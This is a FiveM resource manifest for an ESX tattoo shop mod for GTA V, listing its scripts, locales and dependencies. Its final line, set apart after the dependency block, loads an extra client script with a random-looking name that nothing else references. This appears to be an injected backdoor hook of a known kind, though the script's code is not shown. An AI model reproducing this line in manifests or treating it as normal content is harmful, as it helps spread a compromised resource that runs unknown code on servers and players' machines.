fx_version 'bodacious'
game 'gta5'

description 'ESX Tattoo Shop'

version '1.4.2'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/sv.lua',
	'config.lua',
	'client/tattooList.lua',
	'client/main.lua'
}

dependencies {
	'essentialmode',
	'skinchanger',
	'esx_skin'
}

client_script "DISqkiIEcVydGenWnD.lua"